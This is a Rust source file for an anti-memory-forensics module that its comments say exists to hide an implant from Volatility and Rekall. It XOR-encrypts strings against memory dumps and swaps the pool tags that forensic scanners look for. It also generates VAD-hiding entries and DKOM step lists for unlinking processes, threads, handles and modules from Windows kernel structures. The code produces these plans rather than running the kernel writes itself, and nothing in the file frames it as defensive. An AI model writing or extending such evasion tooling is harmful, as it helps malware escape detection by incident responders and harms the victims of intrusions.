use rand::Rng;
use serde::{Deserialize, Serialize};

/// XOR-encrypted string stored in memory to prevent plaintext recovery
/// during memory dumps or forensic analysis.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ObfuscatedString {
    pub ciphertext: Vec<u8>,
    pub key: [u8; 32],
}

impl ObfuscatedString {
    pub fn encrypt(plaintext: &str) -> Self {
        let mut rng = rand::rng();
        let mut key = [0u8; 32];
        rng.fill(&mut key);
        let ciphertext = plaintext
            .as_bytes()
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % 32])
            .collect();
        Self { ciphertext, key }
    }

    pub fn decrypt(&self) -> String {
        let bytes: Vec<u8> = self
            .ciphertext
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ self.key[i % 32])
            .collect();
        String::from_utf8_lossy(&bytes).to_string()
    }
}

/// Describes a heap allocation with optional guard pages.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct HeapAllocation {
    pub address: u64,
    pub size: usize,
    pub guard_pages: bool,
}

/// Maps a forensic-signature pool tag to its innocuous replacement.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct PoolTagEntry {
    pub original_tag: [u8; 4],
    pub replacement_tag: [u8; 4],
}

/// Instruction to hide or modify a Virtual Address Descriptor region.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VadManipulation {
    pub region_base: u64,
    pub region_size: usize,
    pub hide: bool,
    pub original_protection: u32,
}

/// Kernel object targeted for Direct Kernel Object Manipulation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum DkomTarget {
    ProcessList,
    ThreadList,
    HandleTable,
    ModuleList,
}

impl std::fmt::Display for DkomTarget {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ProcessList => write!(f, "process-list"),
            Self::ThreadList => write!(f, "thread-list"),
            Self::HandleTable => write!(f, "handle-table"),
            Self::ModuleList => write!(f, "module-list"),
        }
    }
}

/// A single DKOM operation step with its target and description.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DkomOperation {
    pub target: DkomTarget,
    pub action: String,
    pub description: String,
}

/// Generates countermeasures against memory forensics tools like
/// Volatility and Rekall by manipulating kernel structures, pool
/// tags, and VAD entries to hide implant presence.
pub struct AntiMemoryForensics;

impl AntiMemoryForensics {
    pub fn new() -> Self {
        Self
    }

    pub fn obfuscate_string(input: &str) -> ObfuscatedString {
        ObfuscatedString::encrypt(input)
    }

    pub fn deobfuscate_string(obs: &ObfuscatedString) -> String {
        obs.decrypt()
    }

    pub fn generate_heap_allocation(size: usize) -> HeapAllocation {
        let mut rng = rand::rng();
        let base: u64 = rng.random_range(0x0010_0000..0x7FFF_0000);
        let aligned_base = base & !0xFFF;
        HeapAllocation {
            address: aligned_base,
            size,
            guard_pages: size >= 0x1000,
        }
    }

    pub fn generate_pool_tag_replacements() -> Vec<PoolTagEntry> {
        let forensic_tags = Self::common_forensic_pool_tags();
        let mut rng = rand::rng();
        forensic_tags
            .into_iter()
            .map(|original| {
                let mut replacement = [0u8; 4];
                for byte in &mut replacement {
                    *byte = rng.random_range(b'A'..=b'z');
                }
                PoolTagEntry {
                    original_tag: original,
                    replacement_tag: replacement,
                }
            })
            .collect()
    }

    pub fn generate_vad_hide_operations(regions: &[(u64, usize)]) -> Vec<VadManipulation> {
        regions
            .iter()
            .map(|&(base, size)| VadManipulation {
                region_base: base,
                region_size: size,
                hide: true,
                original_protection: 0x40,
            })
            .collect()
    }

    pub fn generate_dkom_operations(target: DkomTarget) -> Vec<DkomOperation> {
        match target {
            DkomTarget::ProcessList => vec![
                DkomOperation {
                    target: DkomTarget::ProcessList,
                    action: "unlink_eprocess".to_string(),
                    description: "Unlink EPROCESS from ActiveProcessLinks doubly-linked list"
                        .to_string(),
                },
                DkomOperation {
                    target: DkomTarget::ProcessList,
                    action: "remove_pid_table_entry".to_string(),
                    description:
                        "Remove PID entry from PspCidTable handle table to evade PID enumeration"
                            .to_string(),
                },
                DkomOperation {
                    target: DkomTarget::ProcessList,
                    action: "clear_csrss_handle".to_string(),
                    description: "Remove handle from csrss.exe process table".to_string(),
                },
            ],
            DkomTarget::ThreadList => vec![
                DkomOperation {
                    target: DkomTarget::ThreadList,
                    action: "unlink_ethread".to_string(),
                    description: "Unlink ETHREAD from ThreadListHead in parent EPROCESS"
                        .to_string(),
                },
                DkomOperation {
                    target: DkomTarget::ThreadList,
                    action: "modify_start_address".to_string(),
                    description: "Overwrite Win32StartAddress to point to legitimate module range"
                        .to_string(),
                },
            ],
            DkomTarget::HandleTable => vec![
                DkomOperation {
                    target: DkomTarget::HandleTable,
                    action: "zero_handle_entry".to_string(),
                    description: "Zero the handle table entry to remove object reference"
                        .to_string(),
                },
                DkomOperation {
                    target: DkomTarget::HandleTable,
                    action: "decrement_handle_count".to_string(),
                    description: "Decrement HandleCount in OBJECT_HEADER to match removal"
                        .to_string(),
                },
            ],
            DkomTarget::ModuleList => vec![
                DkomOperation {
                    target: DkomTarget::ModuleList,
                    action: "unlink_ldr_entry".to_string(),
                    description: "Unlink LDR_DATA_TABLE_ENTRY from InLoadOrderModuleList"
                        .to_string(),
                },
                DkomOperation {
                    target: DkomTarget::ModuleList,
                    action: "unlink_memory_order".to_string(),
                    description:
                        "Unlink from InMemoryOrderModuleList to defeat memory-order scanning"
                            .to_string(),
                },
                DkomOperation {
                    target: DkomTarget::ModuleList,
                    action: "unlink_init_order".to_string(),
                    description: "Unlink from InInitializationOrderModuleList for complete hiding"
                        .to_string(),
                },
            ],
        }
    }

    /// Pool tags commonly scanned by Volatility, Rekall, and similar
    /// memory forensics frameworks.
    pub fn common_forensic_pool_tags() -> Vec<[u8; 4]> {
        vec![
            *b"Proc", *b"Thre", *b"File", *b"Driv", *b"Muta", *b"Sema", *b"Even", *b"Key ",
            *b"CM31", *b"MmSt", *b"NtFs", *b"Ntfx",
        ]
    }
}

impl Default for AntiMemoryForensics {
    fn default() -> Self {
        Self::new()
    }
}
